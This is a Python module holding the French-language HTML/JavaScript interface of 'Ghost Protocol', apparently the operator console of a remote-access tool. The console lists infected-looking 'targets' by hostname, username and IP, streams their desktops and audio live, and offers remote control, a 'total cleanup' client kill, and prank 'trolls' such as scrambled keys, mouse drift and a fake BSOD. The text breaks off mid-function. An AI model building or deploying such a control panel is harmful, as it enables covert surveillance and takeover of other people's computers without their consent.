# -*- coding: utf-8 -*-
"""
================================================================================
                    GHOST PROTOCOL - EMBEDDED HTML FRONTEND
================================================================================
Ce module contient l'interface utilisateur moderne, sobre et haute performance
au format HTML/CSS/JS, intégrée dans le viewer PyWebView de bureau.
"""

HTML_CONTENT = """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ghost Protocol — Console Opérateur (Desktop)</title>
    
    <!-- Polices modernes & nettes : Inter & JetBrains Mono -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-base: #090a0f;
            --bg-card: #12141c;
            --bg-card-hover: #171a25;
            --bg-surface: #191c28;
            --bg-input: #0c0d14;
            
            --border-subtle: rgba(255, 255, 255, 0.08);
            --border-hover: rgba(255, 255, 255, 0.16);
            --border-active: #6366f1;

            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --primary-subtle: rgba(99, 102, 241, 0.12);

            --success: #10b981;
            --success-hover: #059669;
            --success-subtle: rgba(16, 185, 129, 0.12);

            --danger: #f43f5e;
            --danger-hover: #e11d48;
            --danger-subtle: rgba(244, 63, 94, 0.12);

            --warning: #f59e0b;
            --warning-subtle: rgba(245, 158, 11, 0.12);

            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --text-dim: #64748b;

            --radius-sm: 6px;
            --radius-md: 10px;
            --radius-lg: 14px;
            --radius-full: 9999px;

            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            --font-mono: 'JetBrains Mono', ui-monospace, monospace;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-base);
            background-image: radial-gradient(ellipse at 50% 0%, #151824 0%, #090a0f 75%);
            color: var(--text-main);
            font-family: var(--font-sans);
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            letter-spacing: -0.01em;
            user-select: none;
        }

        /* --- HEADER PRINCIPAL --- */
        header {
            height: 56px;
            min-height: 56px;
            background: var(--bg-card);
            border-bottom: 1px solid var(--border-subtle);
            padding: 0 18px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            z-index: 10;
        }

        .header-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .brand-icon {
            width: 28px;
            height: 28px;
            border-radius: var(--radius-sm);
            background: var(--primary);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 700;
            font-size: 0.85rem;
        }

        .header-brand h1 {
            font-size: 0.95rem;
            font-weight: 600;
            letter-spacing: -0.02em;
            color: var(--text-main);
        }

        .header-brand .badge-tag {
            font-size: 0.7rem;
            font-weight: 500;
            background: var(--primary-subtle);
            color: var(--primary);
            padding: 2px 7px;
            border-radius: var(--radius-full);
        }

        .status-pill {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 5px 12px;
            border-radius: var(--radius-full);
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border-subtle);
            font-size: 0.78rem;
            font-family: var(--font-mono);
            color: var(--text-muted);
        }

        .status-dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background-color: var(--success);
        }

        /* --- NAVIGATION MOBILE PAR ONGLETS --- */
        .mobile-nav {
            display: none;
            background: var(--bg-card);
            border-bottom: 1px solid var(--border-subtle);
            padding: 4px;
            gap: 4px;
            z-index: 9;
        }

        .nav-tab-btn {
            flex: 1;
            padding: 9px 4px;
            font-size: 0.78rem;
            font-weight: 600;
            color: var(--text-muted);
            background: transparent;
            border: none;
            border-radius: var(--radius-sm);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: all 0.15s ease;
        }

        .nav-tab-btn.active {
            color: var(--text-main);
            background: var(--bg-surface);
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }

        /* --- GRILLE PRINCIPALE (DESKTOP) --- */
        main {
            flex: 1;
            display: grid;
            grid-template-columns: 290px 1fr 350px;
            gap: 12px;
            padding: 12px 16px;
            min-height: 0;
            overflow: hidden;
        }

        /* --- CARTE COMMUNE (PANEL) --- */
        .panel {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-lg);
            display: flex;
            flex-direction: column;
            min-height: 0;
            overflow: hidden;
        }

        .panel-header {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-subtle);
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.04em;
        }

        .panel-header-title {
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-main);
        }

        .counter-badge {
            font-size: 0.72rem;
            font-weight: 500;
            padding: 2px 7px;
            border-radius: var(--radius-full);
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-muted);
        }

        /* --- COLONNE GAUCHE : CIBLES & INFOS --- */
        .target-list-container {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .target-item {
            background: var(--bg-base);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-md);
            padding: 11px 13px;
            cursor: pointer;
            transition: all 0.15s ease;
        }

        .target-item:hover {
            background: var(--bg-card-hover);
            border-color: var(--border-hover);
        }

        .target-item.selected {
            background: var(--primary-subtle);
            border-color: var(--primary);
        }

        .target-item-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 4px;
        }

        .target-name {
            font-size: 0.85rem;
            font-weight: 600;
            color: var(--text-main);
        }

        .target-chip {
            font-size: 0.68rem;
            font-family: var(--font-mono);
            color: var(--success);
            background: var(--success-subtle);
            padding: 2px 6px;
            border-radius: var(--radius-sm);
        }

        .target-meta {
            font-size: 0.75rem;
            color: var(--text-muted);
            display: flex;
            justify-content: space-between;
            font-family: var(--font-mono);
        }

        .target-details-box {
            padding: 12px 14px;
            border-top: 1px solid var(--border-subtle);
            background: var(--bg-input);
            display: flex;
            flex-direction: column;
            gap: 7px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            font-size: 0.77rem;
        }

        .info-label {
            color: var(--text-dim);
        }

        .info-value {
            color: var(--text-main);
            font-family: var(--font-mono);
            font-weight: 500;
            max-width: 65%;
            text-align: right;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .btn-secondary {
            background: transparent;
            color: var(--text-muted);
            border: 1px solid var(--border-subtle);
            padding: 8px 12px;
            border-radius: var(--radius-md);
            font-size: 0.78rem;
            font-weight: 500;
            cursor: pointer;
            margin: 10px;
            transition: all 0.15s ease;
        }

        .btn-secondary:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-main);
            border-color: var(--border-hover);
        }

        .btn-secondary:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        /* --- COLONNE CENTRALE : STREAM VIDÉO --- */
        .stream-panel {
            display: flex;
            flex-direction: column;
            background: var(--bg-card);
        }

        .stream-header-actions {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .live-tag {
            font-size: 0.7rem;
            font-weight: 600;
            font-family: var(--font-mono);
            padding: 2px 7px;
            border-radius: var(--radius-sm);
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-muted);
        }

        .live-tag.active {
            background: var(--success-subtle);
            color: var(--success);
        }

        .icon-btn {
            background: transparent;
            border: 1px solid var(--border-subtle);
            color: var(--text-muted);
            padding: 5px 9px;
            border-radius: var(--radius-sm);
            font-size: 0.75rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: all 0.15s ease;
        }

        .icon-btn:hover {
            color: var(--text-main);
            border-color: var(--border-hover);
            background: rgba(255, 255, 255, 0.04);
        }

        .screen-container {
            flex: 1;
            background-color: #040508;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 0;
            padding: 10px;
            overflow: hidden;
        }

        .screen-img, .screen-canvas {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            border-radius: var(--radius-sm);
            display: none;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
        }

        .screen-placeholder {
            text-align: center;
            color: var(--text-muted);
            padding: 24px;
            max-width: 360px;
        }

        .screen-placeholder-icon {
            font-size: 2rem;
            margin-bottom: 12px;
            opacity: 0.4;
        }

        .screen-placeholder-title {
            font-size: 0.92rem;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 6px;
        }

        .screen-placeholder-desc {
            font-size: 0.8rem;
            line-height: 1.45;
            color: var(--text-dim);
        }

        /* --- COLONNE DROITE : COMMANDES & ACTIONS --- */
        .right-panel-content {
            flex: 1;
            overflow-y: auto;
            padding: 14px;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        .section-box {
            background: var(--bg-base);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-md);
            padding: 12px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .section-title {
            font-size: 0.72rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-dim);
            margin-bottom: 2px;
        }

        .input-group {
            display: flex;
            gap: 6px;
        }

        input[type="text"] {
            flex: 1;
            background: var(--bg-input);
            border: 1px solid var(--border-subtle);
            color: var(--text-main);
            padding: 9px 12px;
            font-family: inherit;
            font-size: 0.82rem;
            border-radius: var(--radius-sm);
            outline: none;
            transition: border-color 0.15s ease;
        }

        input[type="text"]:focus:not(:disabled) {
            border-color: var(--border-active);
        }

        input[type="text"]:disabled {
            opacity: 0.35;
            cursor: not-allowed;
        }

        .btn {
            padding: 9px 14px;
            font-size: 0.8rem;
            font-weight: 600;
            border-radius: var(--radius-sm);
            border: 1px solid transparent;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: all 0.15s ease;
            text-align: center;
        }

        .btn:disabled {
            opacity: 0.35;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-primary {
            background: var(--primary);
            color: #fff;
        }
        .btn-primary:hover:not(:disabled) {
            background: var(--primary-hover);
        }

        .btn-success {
            background: var(--success);
            color: #fff;
        }
        .btn-success:hover:not(:disabled) {
            background: var(--success-hover);
        }

        .btn-danger {
            background: var(--danger);
            color: #fff;
        }
        .btn-danger:hover:not(:disabled) {
            background: var(--danger-hover);
        }

        .btn-remote {
            background: rgba(99, 102, 241, 0.1);
            border-color: rgba(99, 102, 241, 0.3);
            color: #c7d2fe;
            width: 100%;
        }
        .btn-remote:hover:not(:disabled) {
            background: rgba(99, 102, 241, 0.2);
            color: #fff;
        }
        .btn-remote.active {
            background: var(--primary);
            color: #fff;
            border-color: var(--primary);
        }

        .protocol-actions-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
        }

        .trolls-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 6px;
        }

        .troll-toggle {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-sm);
            padding: 8px 10px;
            font-size: 0.74rem;
            font-weight: 500;
            color: var(--text-muted);
            cursor: pointer;
            text-align: left;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: all 0.15s ease;
        }

        .troll-toggle:hover:not(:disabled) {
            background: var(--bg-card-hover);
            color: var(--text-main);
            border-color: var(--border-hover);
        }

        .troll-toggle.active {
            background: var(--success-subtle);
            border-color: rgba(16, 185, 129, 0.35);
            color: #d1fae5;
        }

        .troll-state-indicator {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: var(--text-dim);
        }

        .troll-toggle.active .troll-state-indicator {
            background: var(--success);
        }

        .select-input {
            width: 100%;
            padding: 7px 10px;
            background: var(--bg-input);
            border: 1px solid var(--border-subtle);
            color: var(--text-main);
            border-radius: var(--radius-sm);
            font-size: 0.78rem;
            outline: none;
            cursor: pointer;
        }

        .slider-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .slider-header {
            display: flex;
            justify-content: space-between;
            font-size: 0.76rem;
            color: var(--text-muted);
        }

        .slider-val-badge {
            font-family: var(--font-mono);
            font-weight: 600;
            color: var(--primary);
        }

        input[type="range"] {
            width: 100%;
            height: 4px;
            border-radius: var(--radius-full);
            background: rgba(255, 255, 255, 0.1);
            outline: none;
            accent-color: var(--primary);
            cursor: pointer;
        }

        .terminal-container {
            background: var(--bg-input);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-sm);
            padding: 8px 10px;
            font-family: var(--font-mono);
            font-size: 0.73rem;
            line-height: 1.45;
            height: 140px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .log-info { color: #cbd5e1; }
        .log-cmd { color: #86efac; }
        .log-alert { color: #fda4af; }
        .log-warning { color: #fde047; }

        #stream-container:fullscreen {
            width: 100vw;
            height: 100vh;
            background-color: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
        }
        #stream-container:fullscreen img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            border-radius: 0;
            box-shadow: none;
        }

        @media (max-width: 960px) {
            body {
                overflow: hidden;
            }

            .mobile-nav {
                display: flex;
            }

            main {
                display: block;
                position: relative;
                padding: 10px;
                height: calc(100vh - 56px - 44px);
            }

            .panel {
                display: none;
                height: 100%;
                border-radius: var(--radius-md);
            }

            .panel.tab-visible {
                display: flex;
            }

            .right-panel-content {
                padding: 10px;
                gap: 10px;
            }

            .trolls-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <div class="header-brand">
            <div class="brand-icon">G</div>
            <h1>Ghost Studio Console</h1>
            <span class="badge-tag">Desktop Pro</span>
        </div>
        <div class="status-pill">
            <span id="status-dot" class="status-dot"></span>
            <span id="status-text">Prêt</span>
        </div>
    </header>

    <!-- Navigation tactile pour smartphone ou fenêtres compactes -->
    <nav class="mobile-nav" id="mobile-nav">
        <button class="nav-tab-btn active" data-tab="stream">
            <span>📺</span> Flux
        </button>
        <button class="nav-tab-btn" data-tab="targets">
            <span>💻</span> Appareils
        </button>
        <button class="nav-tab-btn" data-tab="actions">
            <span>⚡</span> Commandes
        </button>
        <button class="nav-tab-btn" data-tab="logs">
            <span>📋</span> Journal
        </button>
    </nav>

    <main>
        <!-- Volet 1 : Appareils & Spécifications -->
        <section class="panel" id="panel-targets">
            <div class="panel-header">
                <div class="panel-header-title">
                    <span>Appareils en ligne</span>
                </div>
                <span id="target-count" class="counter-badge">0</span>
            </div>
            
            <div id="target-list" class="target-list-container">
                <div style="text-align: center; color: var(--text-dim); padding: 30px 10px; font-size: 0.8rem;">
                    En attente de connexion...
                </div>
            </div>

            <!-- Fiche technique de la cible sélectionnée -->
            <div class="target-details-box">
                <div class="info-row">
                    <span class="info-label">Poste :</span>
                    <span id="info-pc" class="info-value">-</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Session :</span>
                    <span id="info-user" class="info-value">-</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Système :</span>
                    <span id="info-os" class="info-value">-</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Adresse IP :</span>
                    <span id="info-ip" class="info-value">-</span>
                </div>
            </div>

            <button id="btn-deselect" class="btn-secondary" disabled>Désélectionner l'appareil</button>
        </section>

        <!-- Volet 2 : Visionneuse Flux Vidéo -->
        <section class="panel stream-panel tab-visible" id="panel-stream">
            <div class="panel-header">
                <div class="panel-header-title">
                    <span>Transmission vidéo</span>
                    <span id="stream-status" class="live-tag">HORS LIGNE</span>
                </div>
                <div class="stream-header-actions">
                    <button class="icon-btn" id="btn-fullscreen" title="Plein écran">
                        <span>⛶</span> Plein écran
                    </button>
                </div>
            </div>

            <div class="screen-container" id="stream-container">
                <canvas id="stream-canvas" class="screen-canvas"></canvas>
                <img id="stream-view" class="screen-img" alt="Direct" decoding="async" style="display:none;">
                <div id="stream-placeholder" class="screen-placeholder">
                    <div class="screen-placeholder-icon">🖥️</div>
                    <div class="screen-placeholder-title">Aucun flux actif</div>
                    <div class="screen-placeholder-desc">
                        Sélectionnez un appareil dans la liste pour démarrer l'affichage du bureau en temps réel.
                    </div>
                </div>
            </div>
        </section>

        <!-- Volet 3 : Centre de Commandes & Farces -->
        <section class="panel" id="panel-actions">
            <div class="panel-header">
                <div class="panel-header-title">
                    <span>Actions & Contrôles</span>
                </div>
            </div>

            <div class="right-panel-content">
                
                <!-- Commandes système & Message -->
                <div class="section-box">
                    <div class="section-title">Message à l'écran</div>
                    <div class="input-group">
                        <input type="text" id="troll-msg-input" placeholder="Tapez un message..." disabled>
                        <button id="btn-send-msg" class="btn btn-primary" disabled>Envoyer</button>
                    </div>

                    <div class="section-title" style="margin-top: 6px;">Protocole de sécurité</div>
                    <div class="protocol-actions-grid">
                        <button id="btn-start-protocol" class="btn btn-danger" disabled>Lancer</button>
                        <button id="btn-stop-protocol" class="btn btn-success" disabled>Arrêter</button>
                    </div>

                    <button id="btn-kill-client" class="btn" style="margin-top: 5px; background: linear-gradient(135deg, #b91c1c, #7f1d1d); color: white; width: 100%; padding: 7px; border-radius: 6px; font-weight: bold; border: 1px solid #ef4444; cursor: pointer;" disabled>
                        🛑 Quitter / Tuer le Client (Nettoyage Total)
                    </button>

                    <button id="btn-remote-control" class="btn btn-remote" style="margin-top: 4px;" disabled>
                        🎮 Contrôle à distance (Inactif)
                    </button>
                </div>

                <!-- Trolls & Farces -->
                <div class="section-box">
                    <div class="section-title">Farces en direct (Trolls)</div>
                    
                    <div class="trolls-grid">
                        <button id="troll-drift" class="troll-toggle" data-troll="drift" disabled>
                            <span>Souris dérivante 🏋️‍♂️</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-drunk_mouse" class="troll-toggle" data-troll="drunk_mouse" disabled>
                            <span>Souris ivre 🍺</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-invisible_wall" class="troll-toggle" data-troll="invisible_wall" disabled>
                            <span>Mur invisible 🧱</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-pixels" class="troll-toggle" data-troll="pixels" disabled>
                            <span>Peintre fou 🎨</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-prank_keys" class="troll-toggle" data-troll="prank_keys" disabled>
                            <span>Touches folles ⌨️</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-ghost_sounds" class="troll-toggle" data-troll="ghost_sounds" disabled>
                            <span>Fantôme farceur 👻</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-system_tts" class="troll-toggle" data-troll="system_tts" disabled>
                            <span>Mégaphone d'alerte 📢</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-screen_rotate" class="troll-toggle" data-troll="screen_rotate" disabled>
                            <span>Bascule 180° 🔄</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-elusive_window" class="troll-toggle" data-troll="elusive_window" disabled>
                            <span>Fenêtre fuyante 🏃‍♂️</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-monkey_volume" class="troll-toggle" data-troll="monkey_volume" disabled>
                            <span>Singe Pixel Art 🐵🔉</span>
                            <span class="troll-state-indicator"></span>
                        </button>

                        <button id="troll-bsod" class="troll-toggle" data-troll="bsod" disabled>
                            <span>Faux BSOD</span>
                            <span class="troll-state-indicator"></span>
                        </button>
                    </div>

                    <div id="elusive-window-container" style="display: none; margin-top: 4px;">
                        <label for="elusive-window-select" style="font-size: 0.72rem; color: var(--text-dim); display: block; margin-bottom: 4px;">Fenêtre à cibler (avec jambes animées) :</label>
                        <select id="elusive-window-select" class="select-input"></select>
                    </div>
                </div>

                <!-- Réglages du flux -->
                <div class="section-box">
                    <div class="section-title">Performances de transmission</div>
                    
                    <div class="slider-group">
                        <div class="slider-header">
                            <span>Images par seconde (FPS)</span>
                            <span id="fps-val" class="slider-val-badge">12</span>
                        </div>
                        <input type="range" id="fps-slider" min="5" max="40" value="12" disabled>
                    </div>

                    <div class="slider-group" style="margin-top: 6px;">
                        <div class="slider-header">
                            <span>Qualité de compression</span>
                            <span id="quality-val" class="slider-val-badge">60%</span>
                        </div>
                        <input type="range" id="quality-slider" min="10" max="95" value="60" disabled>
                    </div>
                </div>

                <!-- Console d'événements -->
                <div class="section-box" id="section-logs">
                    <div class="section-title">Journal d'activité</div>
                    <div id="terminal-logs" class="terminal-container"></div>
                </div>

            </div>
        </section>
    </main>

    <script>
        // État de l'application
        let activeTargets = {};
        let selectedTargetId = null;
        let remoteControlActive = false;

        // Gestion optimisée du rendu (throttling par requestAnimationFrame)
        let pendingB64Image = null;
        let isRenderPending = false;

        // Éléments du DOM
        const targetList = document.getElementById("target-list");
        const targetCount = document.getElementById("target-count");
        const btnDeselect = document.getElementById("btn-deselect");
        
        const streamCanvas = document.getElementById("stream-canvas");
        const streamCtx = streamCanvas ? streamCanvas.getContext("2d", { alpha: false }) : null;
        const streamView = document.getElementById("stream-view");
        const streamPlaceholder = document.getElementById("stream-placeholder");
        const streamStatus = document.getElementById("stream-status");
        const streamContainer = document.getElementById("stream-container");
        const btnFullscreen = document.getElementById("btn-fullscreen");

        const infoPc = document.getElementById("info-pc");
        const infoUser = document.getElementById("info-user");
        const infoOs = document.getElementById("info-os");
        const infoIp = document.getElementById("info-ip");

        const trollMsgInput = document.getElementById("troll-msg-input");
        const btnSendMsg = document.getElementById("btn-send-msg");
        const btnStartProtocol = document.getElementById("btn-start-protocol");
        const btnStopProtocol = document.getElementById("btn-stop-protocol");
        const btnKillClient = document.getElementById("btn-kill-client");

        const fpsSlider = document.getElementById("fps-slider");
        const fpsVal = document.getElementById("fps-val");
        const qualitySlider = document.getElementById("quality-slider");
        const qualityVal = document.getElementById("quality-val");

        const terminalLogs = document.getElementById("terminal-logs");
        const btnRemoteControl = document.getElementById("btn-remote-control");

        // Boutons de troll
        const trollButtons = {
            drift: { btn: document.getElementById("troll-drift"), label: "Souris dérivante 🏋️‍♂️" },
            drunk_mouse: { btn: document.getElementById("troll-drunk_mouse"), label: "Souris ivre 🍺" },
            invisible_wall: { btn: document.getElementById("troll-invisible_wall"), label: "Mur invisible 🧱" },
            pixels: { btn: document.getElementById("troll-pixels"), label: "Peintre fou 🎨" },
            prank_keys: { btn: document.getElementById("troll-prank_keys"), label: "Touches folles ⌨️" },
            ghost_sounds: { btn: document.getElementById("troll-ghost_sounds"), label: "Fantôme farceur 👻" },
            system_tts: { btn: document.getElementById("troll-system_tts"), label: "Mégaphone d'alerte 📢" },
            screen_rotate: { btn: document.getElementById("troll-screen_rotate"), label: "Bascule 180° 🔄" },
            elusive_window: { btn: document.getElementById("troll-elusive_window"), label: "Fenêtre fuyante 🏃‍♂️" },
            monkey_volume: { btn: document.getElementById("troll-monkey_volume"), label: "Singe Pixel Art 🐵🔉" },
            bsod: { btn: document.getElementById("troll-bsod"), label: "Faux BSOD" }
        };

        // Navigation mobile
        const navTabs = document.querySelectorAll(".nav-tab-btn");
        const panelTargets = document.getElementById("panel-targets");
        const panelStream = document.getElementById("panel-stream");
        const panelActions = document.getElementById("panel-actions");
        const sectionLogs = document.getElementById("section-logs");

        navTabs.forEach(btn => {
            btn.addEventListener("click", () => {
                navTabs.forEach(t => t.classList.remove("active"));
                btn.classList.add("active");
                const tab = btn.getAttribute("data-tab");

                panelTargets.classList.remove("tab-visible");
                panelStream.classList.remove("tab-visible");
                panelActions.classList.remove("tab-visible");

                if (tab === "stream") {
                    panelStream.classList.add("tab-visible");
                } else if (tab === "targets") {
                    panelTargets.classList.add("tab-visible");
                } else if (tab === "actions") {
                    panelActions.classList.add("tab-visible");
                    sectionLogs.style.display = "block";
                } else if (tab === "logs") {
                    panelActions.classList.add("tab-visible");
                    sectionLogs.scrollIntoView({ behavior: "smooth" });
                }
            });
        });

        btnFullscreen.addEventListener("click", () => {
            if (!document.fullscreenElement) {
                streamContainer.requestFullscreen().catch(() => {});
            } else {
                document.exitFullscreen().catch(() => {});
            }
        });

        function logMessage(text, type = "info") {
            const time = new Date().toLocaleTimeString();
            const logEntry = document.createElement("div");
            
            if (type === "cmd") logEntry.className = "log-cmd";
            else if (type === "alert") logEntry.className = "log-alert";
            else if (type === "warning") logEntry.className = "log-warning";
            else logEntry.className = "log-info";

            logEntry.textContent = `[${time}] ${text}`;
            terminalLogs.appendChild(logEntry);
            terminalLogs.scrollTop = terminalLogs.scrollHeight;
        }

        // --- FONCTIONS APPELÉES PAR PYTHON (PyWebView) ---
        window.updateTargetsList = function(targetsJson) {
            activeTargets = JSON.parse(targetsJson);
            updateTargetListUI();
            
            if (selectedTargetId && !activeTargets[selectedTargetId]) {
                deselectTarget();
                if (streamPlaceholder) {
                    const titleEl = streamPlaceholder.querySelector(".screen-placeholder-title");
                    if (titleEl) titleEl.textContent = "Appareil hors ligne (déconnecté)";
                }
            } else if (selectedTargetId) {
                const target = activeTargets[selectedTargetId];
                populateWindowsDropdown(target.info.windows);
                updateTrollButtonsUI();
            }
        };

        // Web Audio API
        let audioCtx = null;
        let scheduledTime = 0;

        function playAudioChunkFromBytes(uint8Array) {
            try {
                if (!audioCtx) {
                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    scheduledTime = audioCtx.currentTime;
                }
                
                const len = uint8Array.length;
                const bytes = new Int16Array(len / 2);
                const dataView = new DataView(uint8Array.buffer, uint8Array.byteOffset, len);
                for (let i = 0; i < len; i += 2) {
                    bytes[i / 2] = dataView.getInt16(i, true);
                }
                
                const sampleRate = 22050;
                const buffer = audioCtx.createBuffer(1, bytes.length, sampleRate);
                const channelData = buffer.getChannelData(0);
                for (let i = 0; i < bytes.length; i++) {
                    channelData[i] = bytes[i] / 32768.0;
                }
                
                const source = audioCtx.createBufferSource();
                source.buffer = buffer;
                source.connect(audioCtx.destination);
                
                const currentTime = audioCtx.currentTime;
                if (scheduledTime < currentTime) scheduledTime = currentTime;
                source.start(scheduledTime);
                scheduledTime += buffer.duration;
            } catch (e) {}
        }

        window.playAudioChunk = function(b64Data) {
            try {
                const binaryString = atob(b64Data);
                const len = binaryString.length;
                const bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                playAudioChunkFromBytes(bytes);
            } catch (e) {}
        };

        // Moteur de rendu haute performance via Canvas (zéro scintillement, zéro écran noir, drop frame)
        let isDecodingFrame = false;
        let pendingFrameData = null;

        function renderBase64Frame(b64Data) {
            if (!streamCanvas || !streamCtx) return;
            pendingFrameData = b64Data;
            if (isDecodingFrame) return;

            isDecodingFrame = true;
            const currentData = pendingFrameData;
            pendingFrameData = null;

            const img = new Image();
            img.onload = () => {
                requestAnimationFrame(() => {
                    if (streamCanvas.width !== img.naturalWidth || streamCanvas.height !== img.naturalHeight) {
                        streamCanvas.width = img.naturalWidth;
                        streamCanvas.height = img.naturalHeight;
                    }
                    streamCtx.drawImage(img, 0, 0);
                    if (streamCanvas.style.display !== "block") {
                        streamCanvas.style.display = "block";
                        streamPlaceholder.style.display = "none";
                        streamStatus.textContent = "EN DIRECT";
                        streamStatus.className = "live-tag active";
                    }
                    isDecodingFrame = false;
                    if (pendingFrameData) {
                        const next = pendingFrameData;
                        pendingFrameData = null;
                        renderBase64Frame(next);
                    }
                });
            };
            img.onerror = () => {
                isDecodingFrame = false;
            };
            img.src = "data:image/jpeg;base64," + currentData;
        }

        window.updateScreenshot = function(targetId, b64Image) {
            if (selectedTargetId === targetId) {
                renderBase64Frame(b64Image);
            }
        };

        window.addLog = function(text, type = "info") {
            logMessage(text, type);
        };

        // Interface interne
        function updateTargetListUI() {
            targetList.innerHTML = "";
            const targets = Object.keys(activeTargets);
            targetCount.textContent = targets.length;

            if (targets.length === 0) {
                targetList.innerHTML = `<div style="text-align: center; color: var(--text-dim); padding: 30px 10px; font-size: 0.8rem;">Aucun appareil connecté</div>`;
                return;
            }

            targets.forEach(tid => {
                const target = activeTargets[tid];
                const item = document.createElement("div");
                item.className = `target-item ${selectedTargetId === tid ? 'selected' : ''}`;
                item.innerHTML = `
                    <div class="target-item-top">
                        <span class="target-name">${target.info.hostname}</span>
                        <span class="target-chip">ACTIF</span>
                    </div>
                    <div class="target-meta">
                        <span>${target.info.username}</span>
                        <span>${target.info.ip}</span>
                    </div>
                `;
                item.addEventListener("click", () => selectTarget(tid));
                targetList.appendChild(item);
            });
        }

        function populateWindowsDropdown(windows) {
            const elusiveSelect = document.getElementById("elusive-window-select");
            const currentVal = elusiveSelect.value;
            elusiveSelect.innerHTML = "";

            const autoOpt = document.createElement("option");
            autoOpt.value = "";
            autoOpt.textContent = "Fenêtre active au premier plan (Auto)";
            if (!currentVal) autoOpt.selected = true;
            elusiveSelect.appendChild(autoOpt);

            if (windows && windows.length > 0) {
                windows.forEach(w => {
                    const opt = document.createElement("option");
                    opt.value = w;
                    opt.textContent = w;
                    if (w === currentVal) opt.selected = true;
                    elusiveSelect.appendChild(opt);
                });
            }
        }

        function selectTarget(targetId) {
            selectedTargetId = targetId;
            btnDeselect.disabled = false;
            updateTargetListUI();
            
            const target = activeTargets[targetId];
            logMessage(`Sélection de l'appareil : ${target.info.hostname}`, "info");

            infoPc.textContent = target.info.hostname;
            infoUser.textContent = target.info.username;
            infoOs.textContent = target.info.os;
            infoIp.textContent = target.info.ip;

            trollMsgInput.disabled = false;
            btnSendMsg.disabled = false;
            btnStartProtocol.disabled = false;
